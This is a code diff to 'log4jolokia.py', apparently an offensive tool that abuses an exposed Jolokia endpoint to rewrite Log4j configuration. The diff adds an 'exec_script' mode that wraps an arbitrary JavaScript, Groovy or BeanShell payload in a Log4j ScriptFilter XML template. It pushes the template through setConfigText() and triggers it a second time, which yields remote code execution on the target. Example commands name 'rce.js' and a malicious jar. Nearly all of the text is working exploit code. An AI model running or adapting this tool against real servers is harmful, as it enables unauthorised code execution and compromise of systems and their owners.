@@ -29,7 +29,7 @@ parser = argparse.ArgumentParser(
 			add_help=False,
 			formatter_class=RawTextHelpFormatter)
 
-modes = ["exec_jar", "write_file", "read_file"]
+modes = ["exec_jar", "write_file", "read_file", "exec_script"]
 parser.add_argument('mode', nargs='+',help='choose mode: exec_jar | write_file | read_file',choices=modes)
 parser.add_argument('target', nargs='+',help='URL to jolokia (e.g. http://127.0.0.1:8161/console/jolokia)',type=url)
 
@@ -72,7 +72,7 @@ elif mode == 'write_file':
 	mode_parser.epilog = """Example command:
 	python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -lf 00-ff.txt -w /tmp/test_write -u admin -p admin -H 'Origin: http://localhost'
 	"""
-else:
+elif mode == 'exec_jar':
 	### exec jar
 	mode_parser.add_argument('-j','--jar', nargs='?',help='Path to local jar to be executes on the target (Use only with mode: exec_jar)',required=True)
 	mode_parser.add_argument('--tmp_dir', nargs='?',help='''Location of a writable directory. (Default value is "/tmp")
@@ -81,6 +81,16 @@ else:
 	mode_parser.epilog = "Example command:\n\tpython3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -j mal_linux.jar -u admin -p admin -H 'Origin: http://localhost'"
 	mode_parser.epilog += """\n\nValid jvmtiAgent JARs can be obtained from https://github.com/mbadanoiu/jvmtiAgentLoad-Exploit
 	"""
+elif mode == 'exec_script':
+	### exec script
+	mode_parser.add_argument('-sf','--script_file', nargs='?',help='Path to local file containing the script to be executed on the target (Use only with mode: exec_script)',required=True)
+	mode_parser.add_argument('-l','--language', nargs='?',help='Language of the script to be executed (E.g. javascript, groovy, beanshell, etc.) (Use only with mode: exec_script)',required=True)
+	mode_parser.epilog = "Example command:\n\tpython3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -sf rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'"
+else:
+	### how did we get here?
+	print("[!] Invalid Mode selected")
+	print("[!] Exiting")
+	exit(1)
 
 args = mode_parser.parse_args()
 ### argparse
@@ -141,6 +151,25 @@ appender.logfile.policies.size.type=SizeBasedTriggeringPolicy
 appender.logfile.policies.size.size=2
 appender.logfile.layout.pattern=<<<PATTERN>>>
 """
+
+xml_script_template = """<?xml version="1.0" encoding="UTF-8"?>
+<Configuration status="debug" name="RCETest">
+<Loggers>
+<Logger name="EventLogger" level="debug" additivity="false">
+<ScriptFilter onMatch="ACCEPT" onMisMatch="DENY">
+<Script name="RCE" language="<<<LANGUAGE>>>">
+<<<PAYLOAD>>>
+</Script>
+</ScriptFilter>
+</Logger>
+<Root level="debug">
+<ScriptFilter onMatch="ACCEPT" onMisMatch="DENY">
+<ScriptRef ref="RCE"/>
+</ScriptFilter>
+</Root>
+</Loggers>
+</Configuration>
+""".replace("\n","")
 ### Static content
 
 
@@ -406,6 +435,36 @@ If you agree with the above enter "yes" to continue: """)
 		print("[!] Exiting")
 		exit(1)
 
+def exec_script(target, script_file, language, mbean):
+	x = input(f"""\n[!!!] WARNING: You are about to execute a {language} script from the "{script_file}" file. 
+Keep in mind that this script will be triggered multiple times.
+
+If you agree with the above enter "yes" to continue: """)
+
+	if x.lower() != "yes":
+		print("[!] Non-yes option received")
+		print("[!] Exiting")
+		exit(0)
+
+	print(f"[.] Reading {language} script from {script_file}")
+	f = open(script_file, "rb")
+	content = f.read().decode('latin-1')
+	f.close()
+
+	# generate valid Log4J config containing a script payload
+	xml_script = xml_script_template
+	payload = escape(content)
+	xml_script = xml_script.replace("<<<PAYLOAD>>>", payload)
+	xml_script = xml_script.replace("<<<LANGUAGE>>>", language)
+
+	# send XML to setConfigText()
+	setConfigText(target, xml_script, mbean)
+
+	# calling setConfigText() again in order to force the script to trigger
+	setConfigText(target, "<Configuration></Configuration>", mbean, verbose=False)
+
+	print("[+] The script should have been successfully executed")
+
 ### Code Section
 
 
@@ -419,3 +478,5 @@ elif mode == "write_file":
 	write_file(target, args.local_file, args.write, mbean, args.tmp_dir)
 elif mode == "exec_jar":
 	exec_jar(target, args.jar, mbean, args.tmp_dir)
+elif mode == "exec_script":
+	exec_script(target, args.script_file, args.language, mbean)
